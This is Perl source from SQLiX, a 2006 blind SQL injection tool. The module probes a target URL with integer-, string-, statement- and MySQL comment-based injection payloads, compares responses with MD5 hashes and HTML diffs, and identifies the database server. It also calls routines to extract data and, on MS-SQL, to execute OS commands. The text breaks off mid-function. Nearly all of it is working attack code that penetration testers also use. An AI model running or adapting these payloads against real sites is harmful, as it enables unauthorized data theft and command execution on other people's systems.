#!/usr/bin/perl
#

# -- SQLiX --
#
# © Copyright 2006 Cedric COCHIN, All Rights Reserved.
#

#
#  Blind Injection module
#	- integer based
#	- string based
#	- statement based
#	- comment based (MySQL)
#
#  The module uses a specific detection algorithm based on a function matrix, to determine the version of the SQL server
#

use LWP::UserAgent;
use URI::Escape;
use Digest::MD5  qw(md5 md5_hex md5_base64);
use HTML::TreeBuilder;
use Tie::CharArray;
use Algorithm::Diff;
use strict;

# Global variables
sub analyse;
sub fetch;
sub print_debug;

sub check_blind_integer (%TARGET, $X, $Y,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password);
sub check_blind_string (%TARGET, $X, $Y,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password);
sub check_blind_statement (%TARGET, $X, $Y,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password);
sub compare_vectors (%params);
sub tryout (%params);
sub MD5_NoLink ($);
sub HREF ($);
sub exploit (%params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,$function,$verbose,$b_dico);

# MS-SQL
sub blind_MSSQL_execute_cmd (%params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,$cmd,$option_login,$option_password);
sub blind_MSSQL_OPENROWSET (%params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE);
sub blind_MSSQL_OPENQUERY (%params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE);

##-------------------------------------------------------------------------------------------------
##-------------------------------------------------------------------------------------------------
#
# Injection detection functions
#
##-------------------------------------------------------------------------------------------------
##-------------------------------------------------------------------------------------------------

##-------------------------------------------------------------------------------------------------
# Function check_blind_integer
#
# - performs initial tests on given URI
# - determines if a test method is available (md5, md5_NoLink, HREF Tree)
# - determines if the URL is vulnerable to SQL injection (2 vectors: integer or string based)
# - if vulnerable determines the type of SQL server (currently supported: MS-SQL, MySQL, PostgreSQL)
# - if vulnerable and exploit activated, retrieves [function](default: user) ouput 
##-------------------------------------------------------------------------------------------------

sub check_blind_integer (%TARGET, $X, $Y,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password) {
	my ($TARGET, $X, $Y,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password) = @_;
	
	my %params;
	$params{URL}=$TARGET->{URL};
	$params{HTTP_METHOD}=$TARGET->{HTTP_METHOD};
	$params{CONTENT}=$TARGET->{CONTENT};
	
	## Check if both input are identical
	if($X==$Y) {$X=$X+1;}
	
	## Inverse values if needed
	if($X<$Y) {
		$params{X}=$X;
		$params{Y}=$Y;
	} else {
		$params{X}=$Y;
		$params{Y}=$X;
		$X=$params{X};
		$Y=$params{Y};
	}
	
	my $method=0;
	my $Key = "";
	my $PATTERN = "";
	my $PATTERN_FALSE ="";

	## =================================================================================		
	
	if(compare_vectors(\%params)) {		
			
		##---------------------------------------------------------------------------------
		## Blind Injection detection
		##---------------------------------------------------------------------------------
	
		## Integer based
	
		$params{INJECT} = uri_escape($X."+".($Y-$X));
		if(tryout( \%params )) {
			print_debug("Blind SQL Injection: Integer based",'FOUND',3);
			$method=1;
			$PATTERN = "$X+(".($Y-$X)."*%s)"; $PATTERN_FALSE = "$X+(".($Y-$X)."-%s)";
		}
		
		## Integer based with quotes
		
		$params{INJECT} = uri_escape($X."'+".($Y-$X)."+'0");
		if(tryout( \%params )) {
			print_debug("Blind SQL Injection: Integer based with quotes",'FOUND',3);
			if($method) {
				print_debug("both methods can't be true simultanesly",'ERROR',3);
				return 0;
			}
			$method=2;
			$PATTERN = "$X'+(".($Y-$X)."*%s)+'0"; $PATTERN_FALSE = "$X'+(".($Y-$X)."-%s)+'0";
		}		
		
		## Integer based short version
		# if the variable length is limited we use a shorter vector
		# - doesn't have to be encoded, we gain 2 chars
		
		if(!$method) {
			$params{INJECT} = ($Y+1)."-1";
			if(tryout( \%params )) {
				$method=3;
				print_debug("Blind SQL Injection: Integer based (short)",'FOUND',3);
				$PATTERN = ($Y+1)."-%s"; $PATTERN_FALSE = ($Y+1)."-1-%s";
			}
		
			$params{INJECT} = ($Y+1)."'-1-'0";
			if(tryout( \%params )) {
				print_debug("Blind SQL Injection: Integer based (short) with quotes",'FOUND',3);
				if($method) {
					print_debug("both methods can't be true simultanesly",'ERROR',3);
					return 0;
				}
				$method=4;
				$PATTERN = ($Y+1)."'-%s-'0"; $PATTERN_FALSE = ($Y+1)."'-1-%s-'0";
			}
		}
		
		##---------------------------------------------------------------------------------
		## Database detection (Integer injection)
		##---------------------------------------------------------------------------------
		
		if($method==1) {
			foreach my $DB (keys(%DATABASE)) {
				#print_debug("Trying with ".$DATABASE{$DB}->{DESC},2,3);
				$params{INJECT} = uri_escape($X."+(".($Y-$X)."*".$DATABASE{$DB}->{v_DETECTION}.")");
				if(tryout( \%params )) {
					print_debug("Database type: ".$DATABASE{$DB}->{DESC},'FOUND',3);
					if($Key ne "") {
						print_debug("Multiple ident methods can't be true simultanesly",'ERROR',3);
						return 0;
					}
					$Key = $DB;
				}
			}	
		}
		
		if($method==3) {
			foreach my $DB (keys(%DATABASE)) {
				#print_debug("Trying with ".$DATABASE{$DB}->{DESC},2,3);
				$params{INJECT} = ($Y+1)."-".uri_escape($DATABASE{$DB}->{v_DETECTION});
				if(tryout( \%params )) {
					print_debug("Database type: ".$DATABASE{$DB}->{DESC},'FOUND',3);
					if($Key ne "") {
						print_debug("Multiple ident methods can't be true simultanesly",'ERROR',3);
						return 0;
					}
					$Key = $DB;
				}
			}	
		}
		
		##---------------------------------------------------------------------------------
		## Database detection (Integer injection with quotes)
		##---------------------------------------------------------------------------------
		
		if($method==2) {
			foreach my $DB (keys(%DATABASE)) {
				#print_debug("Trying with ".$DATABASE{$DB}->{DESC},2,3);
				$params{INJECT} = uri_escape($X."'+(".($Y-$X)."*".$DATABASE{$DB}->{v_DETECTION}.")+'0");
				if(tryout( \%params )) {
					print_debug("Database type: ".$DATABASE{$DB}->{DESC},'FOUND',3);
					if($Key ne "") {
						print_debug("Multiple ident methods can't be true simultanesly",'ERROR',3);
						return 0;
					}
					$Key = $DB;
				}
			}	
		}
		
		if($method==4) {
			foreach my $DB (keys(%DATABASE)) {
				#print_debug("Trying with ".$DATABASE{$DB}->{DESC},2,3);
				$params{INJECT} = ($Y+1)."'-".uri_escape($DATABASE{$DB}->{v_DETECTION}."-'0");
				if(tryout( \%params )) {
					print_debug("Database type: ".$DATABASE{$DB}->{DESC},'FOUND',3);
					if($Key ne "") {
						print_debug("Multiple ident methods can't be true simultanesly",'ERROR',3);
						return 0;
					}
					$Key = $DB;
				}
			}	
		}
		
		##---------------------------------------------------------------------------------
		## Fetch function's result
		##---------------------------------------------------------------------------------
		
		if ($b_exploit && $method) {
			exploit(\%params,$method, $Key, "integer", $PATTERN, $PATTERN_FALSE, $function,2,1);
		}
		
		if($method && $Key eq 'MSSQL') {
			if($cmd) {
				blind_MSSQL_execute_cmd(\%params,$method, $Key, "integer", $PATTERN, $PATTERN_FALSE,$cmd,$option_login,$option_password);
			}
			
			if ($b_union) {
				exploit_union(\%params,$method, $Key, "integer",$function);
			}
		}
	}
	
	return ($method, $Key, "Integer".($method<3 ? "" : " (short)").($method%2 ? " without quote" : " with quote"));		
}

##-------------------------------------------------------------------------------------------------
# Function check_blind_string
#
# - performs initial tests on given URI
# - determines if a test method is available (md5, md5_NoLink, HREF Tree)
# - determines if the URL is vulnerable to SQL injection (2 vectors: integer or string based)
# - if vulnerable determines the type of SQL server (currently supported: MS-SQL, MySQL, PostgreSQL)
# - if vulnerable and exploit activated, retrieves [function](default: user) ouput 
##-------------------------------------------------------------------------------------------------

sub check_blind_string (%TARGET, $X, $Y,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password) {
	my ($TARGET, $X, $Y,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password) = @_;
	
	my %params;
	$params{URL}=$TARGET->{URL};
	$params{HTTP_METHOD}=$TARGET->{HTTP_METHOD};
	$params{CONTENT}=$TARGET->{CONTENT};
	
	$params{X}=$X;
	$params{Y}=$Y;
	
	my $method=0;
	my $Key = "";
	my $PATTERN = "";
	my $PATTERN_FALSE = "";
	
	## =================================================================================		
	
	if(compare_vectors(\%params)) {
		
		$Y =~ s/\+/ /g;
		$Y = uri_unescape($Y);
		
		my $lenY=length($Y);
		
		##---------------------------------------------------------------------------------
		## Blind Injection detection
		##---------------------------------------------------------------------------------
	
		## String based (concat +) ==> MS-SQL, MS-Access
		
		$params{INJECT} = uri_escape(substr($Y,0,$lenY-1)."'+'".substr($Y,$lenY-1,1)."'+'");
		#$params{INJECT} = substr($Y,0,$lenY-1)."%27%2B%27".substr($Y,$lenY-1,1)."%27%2B%27";
		if(tryout( \%params )) {
			print_debug("Blind SQL Injection: String based (+)",'FOUND',3);
			#$DB = "MS-SQL/MS-Access";
			
			$method=1;
			
			$PATTERN = substr($Y,0,$lenY-1)."'+char(".(ord(substr($Y,$lenY-1,1))-1)."+%s)+'";
			$PATTERN_FALSE = substr($Y,0,$lenY-1)."-+char(".ord(substr($Y,$lenY-1,1))."+%s)+'";
		}

		## String based (concat ||) ==> PostgreSQL, Oracle
		
		$params{INJECT} = uri_escape(substr($Y,0,$lenY-1)."'||'".substr($Y,$lenY-1,1)."'||'");
		#$params{INJECT} = substr($Y,0,$lenY-1)."%27%7C%7C%27".substr($Y,$lenY-1,1)."%27%7C%7C%27";
		if(tryout( \%params )) {
			if($method) {
				print_debug("Multiple methods can't be true simultanesly",'ERROR',3);
				return 0;
			}
			print_debug("Blind SQL Injection: String based (||)",'FOUND',3);
			#$DB = "PostgreSQL/Oracle";
			$method=2;
		}

	
		## MySQL ==> select * from test where myuser='toto'||length(1)-'1';
		## concat under MySQL, 'toto'+'tata' is not 'tototata'
		## Could generate infinite loops ... needs a little more research
		
		#$params{INJECT} = uri_escape("$Y'||'0");
		#if(tryout( \%params )) {
		#	if($method) {
		#		print_debug("Multiple methods can't be true simultanesly",0,3);
		#		return 0;
		#	}
		#	$params{INJECT} = uri_escape("$Y'||'1");
		#	if(!(tryout( \%params ))) {	
		#		print_debug("Blind SQL Injection: String based (|| - MySQL)",2,3);
		#		$DB = "MySQL";
		#		$method=3;
		#	}
		#}
		
		if($method) {
			foreach my $DB (keys(%DATABASE)) {
				#print_debug("Trying with ".$DATABASE{$DB}->{DESC},2,3);
				$params{INJECT} = uri_escape(sprintf($PATTERN,$DATABASE{$DB}->{v_DETECTION}));
				if(tryout( \%params )) {
					print_debug("Database type: ".$DATABASE{$DB}->{DESC},'FOUND',3);
					if($Key ne "") {
						print_debug("Multiple ident methods can't be true simultanesly",'ERROR',3);
						return 0;
					}
					$Key = $DB;
				}
			}	
		}
	}
	
	if ($b_exploit && $method) {
		exploit(\%params,$method, $Key, "string", $PATTERN, $PATTERN_FALSE, $function,2,1);
	}
	
	if($method && $Key eq 'MSSQL') {
		if($cmd) {
			blind_MSSQL_execute_cmd(\%params,$method, $Key, "string", $PATTERN, $PATTERN_FALSE,$cmd,$option_login,$option_password);
		}
		
		if ($b_union) {
			exploit_union(\%params,$method, $Key, "string",$function);
		}
	}
		
	return ($method,$Key,"String based");	
}

##-------------------------------------------------------------------------------------------------
# Function check_blind_statement
#
# - performs initial tests on given URI
# - determines if a test method is available (md5, md5_NoLink, HREF Tree)
# - determines if the URL is vulnerable to SQL injection (2 vectors: with or without quotes)
# - if vulnerable determines the type of SQL server (currently supported: MS-SQL, MySQL, PostgreSQL)
# - if vulnerable and exploit activated, retrieves [function](default: user) ouput 
##-------------------------------------------------------------------------------------------------

sub check_blind_statement (%TARGET, $X, $Y,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password) {
	my ($TARGET, $X, $Y,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password) = @_;
	
	my %params;
	$params{URL}=$TARGET->{URL};
	$params{HTTP_METHOD}=$TARGET->{HTTP_METHOD};
	$params{CONTENT}=$TARGET->{CONTENT};
	
	$params{X}=$X;
	$params{Y}=$Y;
	
	my $method=0;
	my $Key = "";
	my $PATTERN = "";
	my $PATTERN_FALSE = "";
	
	## =================================================================================		
	
	if(compare_vectors(\%params)) {
		
		##---------------------------------------------------------------------------------
		## Blind Injection detection (statement based)
		##---------------------------------------------------------------------------------
	
		## Statement based without quotes
		
		$params{INJECT} = uri_escape("$Y AND 1=1");
		if(tryout( \%params )) {
			$params{INJECT} = uri_escape("$Y AND 1=0");
			if(!(tryout( \%params ))) {
				print_debug("Blind SQL Injection: Statement based (without quotes)",'FOUND',3);
				$method=1;
				$PATTERN = "$Y AND %s=1"; $PATTERN_FALSE = "$Y AND %s=0";
			}
		}

		## Statement based without quotes
		
		$params{INJECT} = uri_escape("$Y' AND '1'='1");
		if(tryout( \%params )) {
			$params{INJECT} = uri_escape("$Y' AND '1'='0");
			if(!(tryout( \%params ))) {
				print_debug("Blind SQL Injection: Statement based (with quotes)",'FOUND',3);
				if($method) {
					print_debug("Multiple methods can't be true simultanesly",'ERROR',3);
					return 0;
				}
				$method=2;
				$PATTERN = "$Y' AND %s='1"; $PATTERN_FALSE = "$Y' AND %s='0";
			}
		}
		
		##---------------------------------------------------------------------------------
		## Database detection (without quotes)
		##---------------------------------------------------------------------------------
		
		if($method==1) {
			foreach my $DB (keys(%DATABASE)) {
				#print_debug("Trying with ".$DATABASE{$DB}->{DESC},2,3);
				$params{INJECT} = uri_escape("$Y AND ".$DATABASE{$DB}->{v_DETECTION}."=1");
				if(tryout( \%params )) {
					print_debug("Database type: ".$DATABASE{$DB}->{DESC},'FOUND',3);
					if($Key ne "") {
						print_debug("Multiple ident methods can't be true simultanesly",'ERROR',3);
						return 0;
					}
					$Key = $DB;
				}
			}	
		}
		
		##---------------------------------------------------------------------------------
		## Database detection (with quote)
		##---------------------------------------------------------------------------------
		
		if($method==2) {
			foreach my $DB (keys(%DATABASE)) {
				print_debug("Trying with ".$DATABASE{$DB}->{DESC},'DEBUG_L2',3);
				$params{INJECT} = uri_escape("$Y' AND ".$DATABASE{$DB}->{v_DETECTION}."='1");
				if(tryout( \%params )) {
					print_debug("Database type: ".$DATABASE{$DB}->{DESC},'FOUND',3);
					if($Key ne "") {
						print_debug("Multiple ident methods can't be true simultanesly",'ERROR',3);
						return 0;
					}
					$Key = $DB;
				}
			}	
		}
		
		##---------------------------------------------------------------------------------
		## Fetch function's result
		##---------------------------------------------------------------------------------
		
		if ($b_exploit && $method) {
			exploit(\%params,$method, $Key, "statement",$PATTERN,$PATTERN_FALSE,$function,2,1);
		}
		
		if($method && $Key eq 'MSSQL') {
			if($cmd) {
				blind_MSSQL_execute_cmd(\%params,$method, $Key, "statement", $PATTERN, $PATTERN_FALSE,$cmd,$option_login,$option_password);
			}
			
			if ($b_union) {
				exploit_union(\%params,$method, $Key, "statement",$function);
			}
		}
	}
		
	return ($method,$Key,"Statement ".($method==1 ? "without quotes" : "with quotes") );	
}

##-------------------------------------------------------------------------------------------------
# Function check_comment
#
# - performs initial tests on given URI
# - determines if a test method is available (md5, md5_NoLink, HREF Tree)
# - determines if the URL is vulnerable to MySQL comment injection (2 vectors: integer or string based)
# - if vulnerable and exploit activated, retrieves MySQL version
##-------------------------------------------------------------------------------------------------

sub check_comment {
	my ($TARGET, $X, $Y,$b_ident,$b_exploit) = @_;
	
	my $DB="MySQL";
	my $METHOD="";
	my $STOP=0;
	
	my $b_exploit=0;
	my $result=0;
	
	my %params;
	$params{URL}=$TARGET->{URL};
	$params{HTTP_METHOD}=$TARGET->{HTTP_METHOD};
	$params{CONTENT}=$TARGET->{CONTENT};
	
	$params{X}=$X;
	$params{Y}=$Y;

	## =================================================================================		
	
	if(compare_vectors(\%params)) {	
		

		$params{INJECT} = uri_escape($Y."/**/");
		if(tryout( \%params )) {
			$params{INJECT} = uri_escape($Y."/*!a*/");	
			if(!(tryout( \%params ))) {
				print_debug("MySQL Comment based injection (integer based)",'FOUND',3);
				$METHOD="Comment without quotes";
				$result=1;
				$STOP=1;
			}
		}
		$params{INJECT} = uri_escape($Y."'/**/'");
		if(tryout( \%params )) {
			$params{INJECT} = uri_escape($Y."'/*!a*/'");	
			if(!(tryout( \%params ))) {
				print_debug("MySQL Comment based injection (string based)",'FOUND',3);
				if($result) {
					print_debug("Multiple ident methods can't be true simultanesly",'ERROR',3);
					return 0;
				}
				$METHOD="Comment with quotes";
				$result=1;
			}
		}

	}
	
	return ($result,$DB,$METHOD);
}

##-------------------------------------------------------------------------------------------------
##-------------------------------------------------------------------------------------------------
#
# Helper functions
#
##-------------------------------------------------------------------------------------------------
##-------------------------------------------------------------------------------------------------


##-------------------------------------------------------------------------------------------------
# Function MD5_NoLink
#
# Hashes content after deleting all A, IMG, FORM, AREA, IFRAME tags and comments
##-------------------------------------------------------------------------------------------------

sub MD5_NoLink ($) {
	my ($content) = @_;

  	$content =~ s/<a .*<\/a>//ig;
  	$content =~ s/<img .*>//ig;
  	$content =~ s/<form .*>//ig;
  	$content =~ s/<area .*>//ig;
  	$content =~ s/<iframe .*>//ig;
  	$content =~ s/<!--.*-->//ig;
  	# PCI
  	#$content =~s/<input type="hidden" value=".+" name="userid">//ig;
  	
  	return md5_base64($content);	
}

##-------------------------------------------------------------------------------------------------
# Function HREF
#
# Generates an array of HREF for a given HTML content
##-------------------------------------------------------------------------------------------------

sub HREF ($) {
	my ($content) = @_;

	my $tree = HTML::TreeBuilder->new();
  	$tree->parse($content);
  	$tree->eof;
  	
  	my %count = ();
  	
  	my @links_t = $tree->look_down(
			_tag => 'a');

	my @links = ();
	
	foreach my $element (@links_t) { $count{$element->attr('href')}++ }
	foreach my $element (keys %count) {
		## Filter to implement to kill ad's links when semi static
		if($element =~ /www\.gfi\.com\/adentry\.asp/) {
			#do nothing
		} else {
			push @links, $element;
		}
    	} 

  	$tree = $tree->delete;
  	return @links;	
}

##-------------------------------------------------------------------------------------------------
# Function compare_vectors
#
# Analyses given URI and determines which comparison methods could be used
##-------------------------------------------------------------------------------------------------
 

sub compare_vectors(%params) {
	my $params = $_[0];
	my $MD5_test = 1;
	my $MD5_NoLink_test = 0;
	my $HREF_test = 0;
	my $ARRAY_test = 1;
	
	my $X = $params->{X};
	my $Y = $params->{Y};
	my $URL = $params->{URL};
	my $CONTENT = $params->{CONTENT};	
	
	##printf "URL ==> $URL; X ==> $X; Y ==> $Y\n";
	
	my $ua = LWP::UserAgent->new();
	my $res; 

	## =================================================================================
	## Y1
	
	my $URL_t = $URL;
	$URL_t =~ s/--INJECT_HERE--/$Y/;
	my $CONTENT_t = $CONTENT;
	$CONTENT_t =~ s/--INJECT_HERE--/$Y/;
	
	$res = fetch($URL_t, $params->{HTTP_METHOD}, $CONTENT_t); 
	 
    	my $Y1_md5 = md5_base64($res->content);
  	my $Y1_NoLink_md5 = MD5_NoLink( $res->content );
      	my @links_Y1 = HREF($res->content);
      	
      	my @array_Y1 = split(/\n/,$res->content);
	
	## =================================================================================
	## Y2

	$URL_t = $URL_t . "&";
	
	$res = fetch($URL_t, $params->{HTTP_METHOD}, $CONTENT_t);  
	
  	my $Y2_md5 = md5_base64($res->content);
  	my $Y2_NoLink_md5 = MD5_NoLink($res->content);
      	my @links_Y2 = HREF($res->content);
      	
      	my @array_Y2 = split(/\n/,$res->content);

	## =================================================================================
	## Y3

	$URL_t = $URL_t . "myVAR=1234";
	
	$res = fetch($URL_t, $params->{HTTP_METHOD}, $CONTENT_t);  
	
  	my $Y3_md5 = md5_base64($res->content);
  	my $Y3_NoLink_md5 = MD5_NoLink($res->content);
      	my @links_Y3 = HREF($res->content);
      	
      	my @array_Y3 = split(/\n/,$res->content);


	## =================================================================================
  	## Delta Y1/Y2/Y3
  	
  	my @intersection = my @difference = ();
    	my %count = ();
    	
    	foreach my $element (@links_Y1, @links_Y2) { $count{$element}++ }
    	foreach my $element (keys %count) {
		push @{ $count{$element} > 1 ? \@intersection : \@difference }, $element;
    	} 
  	
  	my @links_Y=@intersection;
  	
  	my @array_Y_tmp = Algorithm::Diff::LCS( \@array_Y1, \@array_Y2 );
  	my @array_Y = Algorithm::Diff::LCS( \@array_Y3, \@array_Y_tmp );
  	
  	if( ($Y1_md5 ne $Y2_md5) || ($Y1_md5 ne $Y3_md5))  {
  		$MD5_test=0;
  		print_debug("Page Y is NOT static ==> $Y1_md5",'DEBUG',3);
  	} else {
  		print_debug("Page Y is static ==> $Y1_md5",'DEBUG',3);
  	}
  	
  	if($MD5_NoLink_test) {
	  	if( ($Y1_NoLink_md5 ne $Y2_NoLink_md5) || ($Y1_NoLink_md5 ne $Y3_NoLink_md5) ) {
	  		$MD5_NoLink_test=0;
	  		print_debug("Page Y is NOT 'semi' static ==> $Y1_NoLink_md5",'DEBUG',3);
	  	} else {
	  		print_debug("Page Y is 'semi' static ==> $Y1_NoLink_md5",'DEBUG',3);
	  	}
	}
	
	## =================================================================================
	## X
	
	my $URL_t = $URL;
	$URL_t =~ s/--INJECT_HERE--/$X/;
	my $CONTENT_t = $CONTENT;
	$CONTENT_t =~ s/--INJECT_HERE--/$X/;
	
	$res = fetch($URL_t, $params->{HTTP_METHOD}, $CONTENT_t);  
	 
	my $X_md5 = md5_base64($res->content);
  	my $X_NoLink_md5 = MD5_NoLink($res->content);
      	my @links_X = HREF($res->content);
	
	my @array_X = split(/\n/,$res->content);
	
	## =================================================================================
	## Delta X/Y
	
	if($MD5_test) {
		$X_md5 = md5_base64($res->content);
		if($X_md5 eq $Y1_md5) {
			print_debug ("both MD5 are identical:\t$X_md5 <==> $Y1_md5", 'DEBUG', 3);
			print_debug ("Parameter doesn't impact content", 'ERROR', 3);
			return 0;
		}
	}
	
	if($MD5_NoLink_test) {
		if($MD5_NoLink_test) {
			my $X_NoLink_md5 = MD5_NoLink($res->content);
	 	
			if($X_NoLink_md5 eq $Y1_NoLink_md5) {
				print_debug ("both (NoLink) MD5 are identical:\t$X_NoLink_md5 <==> $Y1_NoLink_md5", 'DEBUG', 3);
				$MD5_NoLink_test=0;
			}
		}
	}
	
	if($HREF_test) {
	  	my @intersection2 = my @difference2 = ();
	    	my %count2 = ();
	  	
	  	foreach my $element (@links_Y, @links_X) { $count2{$element}++ }
	    	foreach my $element (keys %count2) {
			push @{ $count2{$element} > 1 ? \@intersection2 : \@difference2 }, $element;
	    	} 
	  	
	  	if ($#intersection2 == $#links_Y) {
			print_debug("A HREF reference tree included in A HREF test tree, A HREF comparison method can't be used",'WARNING',3);
			$HREF_test=0;
	  	}
  	}
  	
  	my $diff = Algorithm::Diff->new( \@array_Y, \@array_X );
	my $tmp_result = 1;

	$diff->Base( 1 );   # Return line numbers, not indices
	while(  $diff->Next()  ) {
	    	next   if  $diff->Same();
	    
	    	my $bits = $diff->Diff( );
	    	if($bits==1) {
	    		#print "< $_\n"   for  $diff->Items(1);
	    		$tmp_result=0;last;
		}
		
		if($bits==2) {
	    		#print "> $_\n"   for  $diff->Items(2);
		}
	    
	    	if($bits==3) {
	    		#print "< $_\n"   for  $diff->Items(1);
	    		#print "> $_\n"   for  $diff->Items(2);
	    		$tmp_result=0;last;
	    	}
	}
	
	if($tmp_result) {
		print_debug("static part of reference HTML code is included in test HTML code",'DEBUG',3);
		print_debug ("Parameter doesn't impact content", 'ERROR', 3);
		$ARRAY_test=0;
  	}
	
	## =================================================================================
	## Tests Available
	
	if(!($MD5_test || $MD5_NoLink_test || $HREF_test || $ARRAY_test)) {
		print_debug("no comparison method available",'ERROR',3);
		return 0;
	}
	
	$params->{MD5_test}=$MD5_test;
	$params->{MD5_NoLink_test}=$MD5_NoLink_test;
	$params->{HREF_test}=$HREF_test;
	$params->{ARRAY_test}=$ARRAY_test;
	
	$params->{MATCHING_HREF}=\@links_Y;	
	$params->{MATCHING_ARRAY}=\@array_Y;	
	$params->{MATCHING_MD5}=$Y1_md5;
	$params->{MATCHING_MD5_NoLink}=$Y1_NoLink_md5;
	return 1;
}

##-------------------------------------------------------------------------------------------------
# Function tryout
#
# This will send a http request to the target trying to inject whatever code is given in parameter
##-------------------------------------------------------------------------------------------------

sub tryout(%params) {
	my $params = $_[0];
	my $req;
	my $result = 0;
	my @MATCH = @{$params->{MATCHING_HREF}};
	my @HTML = @{$params->{MATCHING_ARRAY}};

	my $INJECT = $params->{INJECT};
	$INJECT =~ s/--FUNCTION--/$params->{FUNCTION}/g;
	$INJECT =~ s/--POS_BIN--/$params->{POS_BIN}/g;
	$INJECT =~ s/--POS_CHAR--/$params->{POS_CHAR}/g;
	$INJECT =~ s/--WORD--/$params->{WORD}/g;
	$INJECT =~ s/--OFFSET--/$params->{OFFSET}/g;

	my $UE_INJECT =  uri_unescape($INJECT);

	my $URL = $params->{URL};
	$URL =~ s/--INJECT_HERE--/$INJECT/g;
	
	my $CONTENT = $params->{CONTENT};
	$CONTENT =~ s/--INJECT_HERE--/$INJECT/;
	
	my $REFERER = "";
	
	if($params->{REFERER}) {
		$REFERER= $params->{REFERER};
		$REFERER =~ s/--INJECT_HERE--/$UE_INJECT/;
	}
	
	my $AGENT = "";
	
	if($params->{AGENT}) {
		$AGENT= $params->{AGENT};
		$AGENT =~ s/--INJECT_HERE--/$UE_INJECT/;
	}
	
	my %COOKIE = ();
	
	if($params->{COOKIE}) {
		%COOKIE->{NAME}=$params->{COOKIE}->{NAME};
		%COOKIE->{VALUE}=$params->{COOKIE}->{VALUE};
		%COOKIE->{DOMAIN}=$params->{COOKIE}->{DOMAIN};
		%COOKIE->{VALUE} =~ s/--INJECT_HERE--/$INJECT/;
	}
	
	my $ua = LWP::UserAgent->new();
	my $res;
	
	$res = fetch($URL, $params->{HTTP_METHOD}, $CONTENT,$REFERER,$AGENT,\%COOKIE);  

	if($params->{MD5_test}) {
		print_debug("We are using MD5",'DEBUG_L2',3);
		if($params->{MATCHING_MD5} eq md5_base64($res->content)) {
			print_debug("FOUND using MD5",'DEBUG_L2',3);
			print_debug("MD5 ==> ".$params->{MATCHING_MD5}." -- ".md5_base64($res->content),'DEBUG_L2',3);
			$result=1;
		}
		else {
			print_debug("NOT FOUND using MD5",'DEBUG_L2',3);
			print_debug("MD5 ==> ".$params->{MATCHING_MD5}." -- ".md5_base64($res->content),'DEBUG_L2',3);
		}
	}
	
	if($params->{MD5_NoLink_test} && !$result) {
		print_debug("We are using MD5_NoLink",'DEBUG_L2',3);
		if($params->{MATCHING_MD5_NoLink} eq MD5_NoLink($res->content)) {
			print_debug("FOUND using MD5_NoLink",'DEBUG_L2',3);
			print_debug("MD5_NoLink ==> ".$params->{MATCHING_MD5_NoLink}." -- ".MD5_NoLink($res->content),'DEBUG_L2',3);
			$result=1;
		}
		else {
			print_debug("NOT FOUND using MD5_NoLink",'DEBUG_L2',3);
			print_debug("MD5_NoLink ==> ".$params->{MATCHING_MD5_NoLink}." -- ".MD5_NoLink($res->content),'DEBUG_L2',3);
		}
	}
	
	if($params->{HREF_test} && !$result) {
		print_debug("We are using HREF",'DEBUG_L2',3);
		my @links_Z = HREF($res->content);
	  	
	  	my @intersection = my @difference = ();
	    	my %count = ();
	  	
	  	foreach my $element (@links_Z, @MATCH) { $count{$element}++ }
	    	foreach my $element (keys %count) {
			push @{ $count{$element} > 1 ? \@intersection : \@difference }, $element;
	    	} 
	  	
	  	if ($#intersection == $#MATCH) {
	  		print_debug("FOUND using HREF",'DEBUG_L2',3);
	  		foreach my $TMP (@MATCH) {
	  			print_debug("HREF ==> $TMP",'DEBUG_L2',4);
	  		}
	  		$result=1;
	  	}
		else {
	 		print_debug("NOT FOUND using HREF",'DEBUG_L2',3);
	 		foreach my $TMP (@difference) {
	  			print_debug("HREF ==> $TMP",'DEBUG_L2',4);
	  		}
	  	}
	}
	
	if($params->{ARRAY_test} && !$result) {
		print_debug("We are using the HTML code",'DEBUG_L2',3);
		my @array_Z = split(/\n/,$res->content);
		
		my $diff = Algorithm::Diff->new( \@HTML, \@array_Z );

		$diff->Base( 1 );   # Return line numbers, not indices
		
		my $tmp_result = 1;
		
		while(  $diff->Next()  ) {
    			next   if  $diff->Same();
    			
    			my $bits = $diff->Diff( );
    			
    			if($bits==1) { ## code from @HTML not includes in @array_Z (not found)
    				$tmp_result=0;
    				last;
    			}
    			
    			if($bits==3) { ## delta between @HTML and  @array_Z ==> need to check if delta is not based on param value
    				print_debug("Difference found",'DEBUG_L2',3);
    				
    				my @item1 = $diff->Items(1);
    				my @item2 = $diff->Items(2);
    
    				print_debug("Reference:\t\t".substr($item1[0],0,120),'DEBUG_L2',4);
    				print_debug("Result:\t\t".substr($item2[0],0,120),'DEBUG_L2',4);
    				
    				# Ignore comments <!-- ... -->
    				# if delta are only comments (could be used by load balancers or web farms) we ignore them
    				
    				if( ($item2[0] =~ m/^\s*\<\!\-\-.*\-\-\>\s*\r?$/)  && ($item1[0] =~ m/^\s*\<\!\-\-.*\-\-\>\s*\r?$/)) {
    					print_debug( "Delta are comments ==> ignored",'DEBUG_L2',4);
    					next;
    				}
    				
    				my $tmp_found=0;
    				
    				my $INJECT_tmp = "";
    				
    				if( !$tmp_found ) {
	    				$INJECT_tmp = quotemeta($INJECT);
	    				
					if($item2[0] =~ /$INJECT_tmp/) {
						print_debug( "INJECT escaped is in the delta:\t\t". $INJECT,'DEBUG_L2',4);
						$tmp_found =1;
					} 
				}
				
				# Un-escape the injected value to use it as a reg exp pattern
    				
				if( !$tmp_found ) {
					$INJECT_tmp = quotemeta(uri_unescape($INJECT));
	    				if($item2[0] =~ /$INJECT_tmp/) {
						print_debug( "INJECT un_escaped is in the delta:\t\t". uri_unescape($INJECT),'DEBUG_L2',4);
						$tmp_found =1;
					}
				}

				if( !$tmp_found ) {
					$INJECT_tmp = quotemeta(uri_unescape($INJECT));
	    				$INJECT_tmp =~ s/ /+/g;
	    				
